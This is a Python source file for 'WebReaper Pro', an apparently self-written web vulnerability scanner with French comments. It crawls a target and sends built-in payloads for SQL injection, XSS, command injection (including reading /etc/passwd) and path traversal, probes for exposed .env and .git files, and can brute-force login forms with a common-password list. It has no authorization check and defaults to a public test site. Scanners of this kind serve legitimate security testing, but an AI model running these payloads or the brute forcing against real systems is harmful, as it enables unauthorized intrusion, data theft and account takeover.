#!/usr/bin/env python3
"""
WebReaper Pro v2.0 — Multi-vector Web Vulnerability Scanner
Usage: python webreaper.py <url> [--deep] [--brute] [--report]
*je scanne tout. je juge rien. je rapporte tout.*
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import re
import sys
import time
import threading
import json
import socket
from queue import Queue
from html.parser import HTMLParser
from datetime import datetime

# ══════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════

TARGET      = sys.argv[1] if len(sys.argv) > 1 else "http://testphp.vulnweb.com"
DEEP_MODE   = "--deep"   in sys.argv
BRUTE_MODE  = "--brute"  in sys.argv
REPORT_MODE = "--report" in sys.argv
TIMEOUT     = 8
MAX_DEPTH   = 3 if DEEP_MODE else 1
THREADS     = 15

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode    = ssl.CERT_NONE

RESULTS  = []
VISITED  = set()
LOCK     = threading.Lock()
URL_Q    = Queue()

# ══════════════════════════════════════════════════
# COULEURS TERMINAL
# ══════════════════════════════════════════════════

R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
B  = "\033[94m"   # blue
M  = "\033[95m"   # magenta
C  = "\033[96m"   # cyan
W  = "\033[97m"   # white
RS = "\033[0m"    # reset
BD = "\033[1m"    # bold

# ══════════════════════════════════════════════════
# PAYLOADS
# ══════════════════════════════════════════════════

SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1\"--",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "' AND SLEEP(3)--",
    "1; WAITFOR DELAY '0:0:3'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "1' AND 1=1--",
    "1' AND 1=2--",
]

SQLI_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql_",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ora-\d{5}",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"postgresql.*error",
    r"sqlite3?\.",
    r"syntax error.*near",
    r"division by zero",
    r"supplied argument is not a valid mysql",
    r"pg_query\(\)",
    r"pg_exec\(\)",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<ScRiPt>alert(1)</sCrIpT>",
]

CMDI_PAYLOADS = [
    "; whoami",
    "| whoami",
    "` whoami`",
    "$(whoami)",
    "; id",
    "| id",
    "& whoami &",
    "; sleep 3",
    "| sleep 3",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "\n whoami",
]

CMDI_INDICATORS = [
    r"root:x:0:0",
    r"uid=\d+\(",
    r"www-data",
    r"daemon",
    r"bin/bash",
    r"bin/sh",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../windows/win.ini",
    "../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "/etc/passwd",
    "C:\\windows\\win.ini",
]

LFI_INDICATORS = [
    r"root:x:0:0",
    r"\[fonts\]",
    r"\[extensions\]",
    r"for 16-bit app support",
    r"daemon:x:",
    r"bin/bash",
]

REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "goto", "target",
    "link", "dest", "destination", "redir", "redirect_uri",
    "redirect_url", "continue", "forward", "location", "back",
]

SENSITIVE_FILES = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.git/config",
    "/.git/HEAD",
    "/config.php",
    "/config.php.bak",
    "/configuration.php",
    "/wp-config.php",
    "/wp-config.php.bak",
    "/database.sql",
    "/dump.sql",
    "/backup.sql",
    "/admin/",
    "/admin/login",
    "/administrator/",
    "/phpmyadmin/",
    "/phpMyAdmin/",
    "/pma/",
    "/mysql/",
    "/panel/",
    "/cpanel/",
    "/.htaccess",
    "/.htpasswd",
    "/server-status",
    "/server-info",
    "/robots.txt",
    "/sitemap.xml",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/api/",
    "/api/v1/",
    "/api/v2/",
    "/swagger.json",
    "/swagger-ui.html",
    "/openapi.json",
    "/actuator",
    "/actuator/env",
    "/actuator/mappings",
    "/debug",
    "/test",
    "/backup/",
    "/old/",
    "/temp/",
    "/tmp/",
    "/logs/",
    "/log/",
    "/error_log",
    "/access_log",
    "/info.php",
    "/phpinfo.php",
    "/test.php",
]

SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
]

BRUTEFORCE_WORDLIST = [
    "admin", "password", "123456", "admin123", "root",
    "toor", "pass", "test", "guest", "qwerty",
    "abc123", "letmein", "monkey", "1234567890", "password1",
    "admin@admin.com", "administrator", "user", "login",
    "welcome", "hello", "dragon", "master", "1234",
    "666666", "12345678", "sunshine", "princess", "iloveyou",
]

# ══════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════

VULN_COUNT  = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}

def log(level, msg, detail=""):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {
        "CRITICAL": f"{R}{BD}[CRITICAL]{RS}",
        "HIGH":     f"{R}[HIGH]{RS}",
        "MEDIUM":   f"{Y}[MEDIUM]{RS}",
        "LOW":      f"{B}[LOW]{RS}",
        "INFO":     f"{C}[INFO]{RS}",
        "SAFE":     f"{G}[SAFE]{RS}",
        "SCAN":     f"{M}[SCAN]{RS}",
    }
    icon = icons.get(level, f"[{level}]")
    line = f"{W}{ts}{RS} {icon} {msg}"
    if detail:
        line += f"\n         {Y}↳ {detail}{RS}"
    print(line)
    with LOCK:
        RESULTS.append({"level": level, "msg": msg, "detail": detail, "ts": ts})
        if level in VULN_COUNT:
            VULN_COUNT[level] += 1

# ══════════════════════════════════════════════════
# HTTP CLIENT
# ══════════════════════════════════════════════════

def fetch(url, data=None, method="GET", extra_headers=None, allow_redirect=True):
    # *chaque requête est une main tendue vers un secret*
    try:
        if data and method == "GET":
            url = url + ("&" if "?" in url else "?") + urllib.parse.urlencode(data)
            req = urllib.request.Request(url)
        elif data and method == "POST":
            body = urllib.parse.urlencode(data).encode()
            req  = urllib.request.Request(url, data=body, method="POST")
        else:
            req = urllib.request.Request(url)

        req.add_header("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36")
        req.add_header("Accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        req.add_header("Accept-Language", "en-US,en;q=0.5")

        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)

        opener = urllib.request.build_opener()
        if not allow_redirect:
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor()
            )
            opener.addheaders = []

        start = time.time()
        with opener.open(req, timeout=TIMEOUT, context=CTX) as r:
            elapsed  = time.time() - start
            body     = r.read().decode("utf-8", errors="ignore")
            headers  = dict(r.headers)
            status   = r.status
            real_url = r.url
            return body, headers, status, elapsed, real_url
    except urllib.error.HTTPError as e:
        return "", {}, e.code, 0, url
    except Exception:
        return None, {}, 0, 0, url

# ══════════════════════════════════════════════════
# HTML PARSER — extrait liens et formulaires
# ══════════════════════════════════════════════════

class SiteParser(HTMLParser):
    # *elle mange le HTML et crache de la structure*
    def __init__(self, base_url):
        super().__init__()
        self.base     = base_url
        self.links    = set()
        self.forms    = []
        self._form    = None
        self._inputs  = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "a" and "href" in attrs:
            href = attrs["href"]
            full = urllib.parse.urljoin(self.base, href)
            if full.startswith(self.base):
                self.links.add(full)

        elif tag == "form":
            self._form   = {
                "action": urllib.parse.urljoin(self.base, attrs.get("action", "")),
                "method": attrs.get("method", "GET").upper(),
                "inputs": []
            }
            self._inputs = []

        elif tag in ("input", "textarea", "select") and self._form is not None:
            name  = attrs.get("name", "")
            type_ = attrs.get("type", "text")
            value = attrs.get("value", "test")
            if name:
                self._form["inputs"].append({
                    "name": name, "type": type_, "value": value
                })

    def handle_endtag(self, tag):
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None

def parse_url_params(url):
    # *disséquer l'URL comme un entomologiste*
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] for k, v in params.items()}

def inject_param(url, param, payload):
    parsed  = urllib.parse.urlparse(url)
    params  = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_q   = urllib.parse.urlencode({k: v[0] for k, v in params.items()})
    return urllib.parse.urlunparse(parsed._replace(query=new_q))

# ══════════════════════════════════════════════════
# MODULE 1 — CRAWLER
# ══════════════════════════════════════════════════

def crawl(base_url, depth=0):
    # *la pieuvre étend ses tentacules dans le site*
    if depth > MAX_DEPTH:
        return set(), []

    body, headers, status, _, _ = fetch(base_url)
    if not body:
        return set(), []

    parser = SiteParser(base_url)
    try:
        parser.feed(body)
    except Exception:
        pass

    return parser.links, parser.forms

# ══════════════════════════════════════════════════
# MODULE 2 — SQL INJECTION
# ══════════════════════════════════════════════════

def test_sqli_url(url):
    # *on chatouille la base de données jusqu'à ce qu'elle crie*
    params = parse_url_params(url)
    if not params:
        return

    for param in params:
        original_body, _, _, baseline_time, _ = fetch(url)
        if original_body is None:
            continue

        for payload in SQLI_PAYLOADS:
            injected_url = inject_param(url, param, params[param] + payload)
            body, _, _, elapsed, _ = fetch(injected_url)
            if body is None:
                continue

            # Error-based detection
            for pattern in SQLI_ERRORS:
                if re.search(pattern, body, re.IGNORECASE):
                    log("CRITICAL",
                        f"SQLi (Error-based) → {urllib.parse.urlparse(url).path}",
                        f"param={param} | payload={payload!r}")
                    return

            # Time-based blind detection
            if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                if elapsed >= 2.5:
                    log("CRITICAL",
                        f"SQLi (Time-based Blind) → {urllib.parse.urlparse(url).path}",
                        f"param={param} | delay={elapsed:.1f}s | payload={payload!r}")
                    return

def test_sqli_form(form):
    # *chaque champ de formulaire est une serrure à crocheter*
    for payload in SQLI_PAYLOADS[:8]:
        data = {}
        for inp in form["inputs"]:
            data[inp["name"]] = inp["value"] + payload if inp["type"] != "hidden" else inp["value"]

        if form["method"] == "POST":
            body, _, _, elapsed, _ = fetch(form["action"], data=data, method="POST")
        else:
            body, _, _, elapsed, _ = fetch(form["action"], data=data)

        if body is None:
            continue

        for pattern in SQLI_ERRORS:
            if re.search(pattern, body, re.IGNORECASE):
                log("CRITICAL",
                    f"SQLi (Form POST) → {form['action']}",
                    f"payload={payload!r}")
                return

        if ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper()) and elapsed >= 2.5:
            log("CRITICAL",
                f"SQLi Time-based (Form) → {form['action']}",
                f"delay={elapsed:.1f}s")
            return

# ══════════════════════════════════════════════════
# MODULE 3 — XSS
# ══════════════════════════════════════════════════

def test_xss_url(url):
    # *le payload cherche un reflet dans la réponse*
    params = parse_url_params(url)
    if not params:
        return

    for param in params:
        for payload in XSS_PAYLOADS:
            injected = inject_param(url, param, payload)
            body, _, _, _, _ = fetch(injected)
            if body and payload in body:
                log("HIGH",
                    f"XSS (Reflected) → {urllib.parse.urlparse(url).path}",
                    f"param={param} | payload={payload!r}")
                return

def test_xss_form(form):
    # *injecter du JavaScript dans chaque champ comme planter des graines*
    for payload in XSS_PAYLOADS[:6]:
        data = {}
        for inp in form["inputs"]:
            data[inp["name"]] = payload if inp["type"] not in ("hidden", "submit") else inp["value"]

        if form["method"] == "POST":
            body, _, _, _, _ = fetch(form["action"], data=data, method="POST")
        else:
            body, _, _, _, _ = fetch(form["action"], data=data)

        if body and payload in body:
            log("HIGH",
                f"XSS (Form Reflected) → {form['action']}",
                f"payload={payload!r}")
            return

# ══════════════════════════════════════════════════
# MODULE 4 — COMMAND INJECTION
# ══════════════════════════════════════════════════

def test_cmdi_url(url):
    # *envoyer des commandes OS là où le dev attendait du texte*
    params = parse_url_params(url)
    if not params:
        return

    for param in params:
        for payload in CMDI_PAYLOADS:
            injected = inject_param(url, param, params[param] + payload)
            body, _, _, elapsed, _ = fetch(injected)
            if body is None:
                continue
            for indicator in CMDI_INDICATORS:
                if re.search(indicator, body, re.IGNORECASE):
                    log("CRITICAL",
                        f"Command Injection → {urllib.parse.urlparse(url).path}",
                        f"param={param} | payload={payload!r} | indicator={indicator}")
                    return
            if "sleep" in payload and elapsed >= 2.5:
                log("CRITICAL",
                    f"Command Injection (Time-based) → {urllib.parse.urlparse(url).path}",
                    f"param={param} | delay={elapsed:.1f}s")
                return

# ══════════════════════════════════════════════════
# MODULE 5 — LFI
# ══════════════════════════════════════════════════

def test_lfi_url(url):
    # *traverser les répertoires comme des couloirs interdits*
    params = parse_url_params(url)
    file_params = [p for p in params if any(k in p.lower()
        for k in ("file", "page", "path", "include", "load", "template", "view", "doc"))]

    targets = file_params if file_params else list(params.keys())

    for param in targets:
        for payload in LFI_PAYLOADS:
            injected = inject_param(url, param, payload)
            body, _, _, _, _ = fetch(injected)
            if body is None:
                continue
            for indicator in LFI_INDICATORS:
                if re.search(indicator, body, re.IGNORECASE):
                    log("CRITICAL",
                        f"LFI (Path Traversal) → {urllib.parse.urlparse(url).path}",
                        f"param={param} | payload={payload!r}")
                    return

# ══════════════════════════════════════════════════
# MODULE 6 — OPEN REDIRECT
# ══════════════════════════════════════════════════

def test_open_redirect(url):
    # *convaincre le site de nous envoyer ailleurs*
    params = parse_url_params(url)
    redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]

    for param in redirect_params:
        evil = "https://evil-canary-check.com"
        injected = inject_param(url, param, evil)
        body, _, _, _, real_url = fetch(injected, allow_redirect=False)
        if real_url and "evil-canary-check" in real_url:
            log("HIGH",
                f"Open Redirect → {urllib.parse.urlparse(url).path}",
                f"param={param} | redirects to external domain")

# ══════════════════════════════════════════════════
# MODULE 7 — SENSITIVE FILES
# ══════════════════════════════════════════════════

def test_sensitive_files(base_url):
    # *frapper à toutes les portes jusqu'à trouver une ouverte*
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    found = []
    lock  = threading.Lock()

    def check_file(path):
        url  = origin + path
        body, headers, status, _, _ = fetch(url)
        if status == 200 and body:
            severity = "CRITICAL" if any(x in path for x in [".env", ".git", "config", "passwd", "sql"]) else "MEDIUM"
            with lock:
                found.append((severity, path, len(body)))
                log(severity,
                    f"Sensitive File Exposed → {path}",
                    f"status=200 | size={len(body)} bytes")

    threads = []
    for path in SENSITIVE_FILES:
        t = threading.Thread(target=check_file, args=(path,))
        t.start()
        threads.append(t)
        if len(threads) >= THREADS:
            for t in threads:
                t.join()
            threads = []
    for t in threads:
        t.join()

# ══════════════════════════════════════════════════
# MODULE 8 — SECURITY HEADERS
# ══════════════════════════════════════════════════

def test_headers(url):
    # *lire les en-têtes comme lire une biographie de négligence*
    _, headers, _, _, _ = fetch(url)
    if not headers:
        return

    for header in SECURITY_HEADERS:
        if not any(h.lower() == header.lower() for h in headers):
            log("LOW",
                f"Missing Security Header → {header}",
                f"url={url}")

    server = headers.get("Server", "")
    if server:
        log("INFO",
            f"Server Banner Disclosed → {server}",
            f"consider hiding this")

    powered = headers.get("X-Powered-By", "")
    if powered:
        log("MEDIUM",
            f"Technology Disclosed → X-Powered-By: {powered}",
            f"reveals backend technology stack")

    # Cookie analysis
    for k, v in headers.items():
        if k.lower() == "set-cookie":
            if "httponly" not in v.lower():
                log("MEDIUM", f"Cookie missing HttpOnly flag", f"cookie={v[:60]}")
            if "secure" not in v.lower():
                log("LOW", f"Cookie missing Secure flag", f"cookie={v[:60]}")
            if "samesite" not in v.lower():
                log("LOW", f"Cookie missing SameSite flag", f"cookie={v[:60]}")

# ══════════════════════════════════════════════════
# MODULE 9 — CORS MISCONFIGURATION
# ══════════════════════════════════════════════════

def test_cors(url):
    # *le serveur va-t-il laisser n'importe qui le toucher ?*
    evil_origin = "https://evil-attacker.com"
    _, headers, _, _, _ = fetch(url, extra_headers={"Origin": evil_origin})
    if not headers:
        return

    acao = headers.get("Access-Control-Allow-Origin", "")
    acac = headers.get("Access-Control-Allow-Credentials", "")

    if acao == "*":
        log("MEDIUM",
            f"CORS Wildcard → Access-Control-Allow-Origin: *",
            f"any domain can read responses")
    elif acao == evil_origin:
        if acac.lower() == "true":
            log("CRITICAL",
                f"CORS Misconfiguration (with credentials) → reflects evil origin",
                f"authenticated requests from attacker domain allowed!")
        else:
            log("HIGH",
                f"CORS Misconfiguration → reflects arbitrary origin",
                f"origin={evil_origin}")

# ══════════════════════════════════════════════════
# MODULE 10 — BRUTE FORCE LOGIN
# ══════════════════════════════════════════════════

def test_brute_force(forms, base_url):
    # *frapper encore et encore jusqu'à ce que la porte cède*
    if not BRUTE_MODE:
        log("INFO", "Brute force skipped (use --brute to enable)")
        return

    login_forms = []
    for form in forms:
        inputs = [i for i in form["inputs"] if i["type"] in ("text", "email", "password")]
        has_password = any(i["type"] == "password" for i in form["inputs"])
        if has_password:
            login_forms.append(form)

    if not login_forms:
        log("INFO", "No login forms detected for brute force")
        return

    for form in login_forms:
        log("SCAN", f"Brute forcing form → {form['action']}")
        user_fields = [i for i in form["inputs"] if i["type"] in ("text", "email")]
        pass_fields = [i for i in form["inputs"] if i["type"] == "password"]

        if not user_fields or not pass_fields:
            continue

        original_body, _, original_status, _, _ = fetch(form["action"])

        for user in ["admin", "administrator", "root", "user"]:
            for password in BRUTEFORCE_WORDLIST:
                data = {}
                for inp in form["inputs"]:
                    if inp["name"] == user_fields[0]["name"]:
                        data[inp["name"]] = user
                    elif inp["name"] == pass_fields[0]["name"]:
                        data[inp["name"]] = password
                    else:
                        data[inp["name"]] = inp["value"]

                body, _, status, _, real_url = fetch(form["action"], data=data, method=form["method"])
                if body is None:
                    continue

                fail_indicators = ["invalid", "incorrect", "wrong", "failed",
                                   "error", "denied", "unauthorized"]
                is_fail = any(ind in (body or "").lower() for ind in fail_indicators)

                if not is_fail and status in (200, 302):
                    if real_url and real_url != form["action"]:
                        log("CRITICAL",
                            f"Login Brute Force SUCCESS → {form['action']}",
                            f"user={user!r} | pass={password!r} | redirect={real_url}")
                        return
                    elif body and original_body and len(body) != len(original_body):
                        log("HIGH",
                            f"Possible Login Success → {form['action']}",
                            f"user={user!r} | pass={password!r} | response differs")
                        return

# ══════════════════════════════════════════════════
# MODULE 11 — INFO LEAK DETECTION
# ══════════════════════════════════════════════════

def test_info_leak(url):
    # *les erreurs bavardent plus que les développeurs*
    body, _, _, _, _ = fetch(url)
    if not body:
        return

    patterns = {
        "Stack Trace":      r"(at\s+[\w\.]+\([\w\.]+:\d+\))",
        "PHP Error":        r"(Parse error|Fatal error|Warning|Notice).*on line \d+",
        "Debug Info":       r"(var_dump|print_r|debug_backtrace)\s*\(",
        "SQL Query Leaked": r"(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\s+[\w\s,`'\*]+",
        "Email Address":    r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
        "IP Address":       r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
        "AWS Key":          r"AKIA[0-9A-Z]{16}",
        "Private Key":      r"-----BEGIN (RSA|EC|PRIVATE) KEY-----",
        "JWT Token":        r"eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+",
    }

    for label, pattern in patterns.items():
        match = re.search(pattern, body)
        if match:
            severity = "CRITICAL" if label in ("AWS Key", "Private Key") else \
                       "HIGH"     if label in ("Stack Trace", "SQL Query Leaked", "JWT Token") else \
                       "MEDIUM"
            log(severity,
                f"Info Leak → {label}",
                f"match={match.group(0)[:80]!r}")

# ══════════════════════════════════════════════════
# RAPPORT FINAL
# ══════════════════════════════════════════════════

def print_report(target, start_time):
    elapsed = time.time() - start_time
    print(f"\n{'═'*65}")
    print(f"{BD}{W}  WebReaper Pro — SCAN REPORT{RS}")
    print(f"{'═'*65}")
    print(f"  {C}Target  {RS}: {target}")
    print(f"  {C}Duration{RS}: {elapsed:.1f}s")
    print(f"  {C}Date    {RS}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'─'*65}")
    print(f"  {R}CRITICAL{RS}: {VULN_COUNT['CRITICAL']}")
    print(f"  {R}HIGH    {RS}: {VULN_COUNT['HIGH']}")
    print(f"  {Y}MEDIUM  {RS}: {VULN_COUNT['MEDIUM']}")
    print(f"  {B}LOW     {RS}: {VULN_COUNT['LOW']}")
    print(f"  {C}INFO    {RS}: {VULN_COUNT['INFO']}")
    total = sum(VULN_COUNT.values())
    print(f"{'─'*65}")
    print(f"  Total findings: {BD}{total}{RS}")
    print(f"{'═'*65}\n")

    if REPORT_MODE:
        fname = f"webreaper_{urllib.parse.urlparse(target).netloc}_{int(time.time())}.json"
        with open(fname, "w") as f:
            json.dump({
                "target": target,
                "scan_date": datetime.now().isoformat(),
                "duration_sec": round(elapsed, 2),
                "summary": VULN_COUNT,
                "findings": RESULTS,
            }, f, indent=2)
        print(f"  {G}Report saved → {fname}{RS}\n")

# ══════════════════════════════════════════════════
# MAIN — ORCHESTRATEUR
# ══════════════════════════════════════════════════

def banner():
    print(f"""
{R}{BD}
 ██╗    ██╗███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
 ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
 ██║ █╗ ██║█████╗  ██████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
 ██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
 ╚███╔███╔╝███████╗██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
{RS}{Y}                    Pro v2.0 — Multi-vector Web Vuln Scanner{RS}
{C}         SQLi | XSS | CMDi | LFI | Redirect | CORS | Headers | Brute{RS}
""")

def main():
    banner()
    start = time.time()

    log("SCAN", f"Target → {TARGET}")
    log("SCAN", f"Mode   → {'DEEP' if DEEP_MODE else 'NORMAL'} | Brute={'ON' if BRUTE_MODE else 'OFF'}")

    # ── CRAWL ─────────────────────────────────────
    log("SCAN", "Crawling site...")
    all_urls  = {TARGET}
    all_forms = []
    queue     = [TARGET]

    for depth in range(MAX_DEPTH + 1):
        new_links = set()
        for url in list(queue):
            with LOCK:
                if url in VISITED:
                    continue
                VISITED.add(url)
            links, forms = crawl(url, depth)
            new_links |= links
            all_forms.extend(forms)
        queue = list(new_links - all_urls)
        all_urls |= new_links

    log("INFO", f"Crawled {len(all_urls)} URLs, found {len(all_forms)} forms")

    # ── HEADER & CORS ──────────────────────────────
    log("SCAN", "Testing headers & CORS...")
    test_headers(TARGET)
    test_cors(TARGET)

    # ── SENSITIVE FILES ────────────────────────────
    log("SCAN", "Testing sensitive file exposure...")
    test_sensitive_files(TARGET)

    # ── INFO LEAK on homepage ──────────────────────
    log("SCAN", "Testing info leakage...")
    test_info_leak(TARGET)

    # ── VULN TESTS per URL ─────────────────────────
    parametric_urls = [u for u in all_urls if "?" in u]
    log("SCAN", f"Testing {len(parametric_urls)} parametric URLs for injections...")

    def scan_url(url):
        test_sqli_url(url)
        test_xss_url(url)
        test_cmdi_url(url)
        test_lfi_url(url)
        test_open_redirect(url)

    url_threads = []
    for url in parametric_urls:
        t = threading.Thread(target=scan_url, args=(url,))
        t.start()
        url_threads.append(t)
        if len(url_threads) >= THREADS:
            for t in url_threads:
                t.join()
            url_threads = []
    for t in url_threads:
        t.join()

    # ── VULN TESTS per FORM ────────────────────────
    log("SCAN", f"Testing {len(all_forms)} forms...")
    for form in all_forms:
        test_sqli_form(form)
        test_xss_form(form)

    # ── BRUTE FORCE ────────────────────────────────
    test_brute_force(all_forms, TARGET)

    # ── RAPPORT ────────────────────────────────────
    print_report(TARGET, start)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python webreaper.py <url> [--deep] [--brute] [--report]")
        print(f"  --deep    : crawl le site entier (plus lent)")
        print(f"  --brute   : active le brute force login")
        print(f"  --report  : sauvegarde un rapport JSON")
        sys.exit(1)
    main()
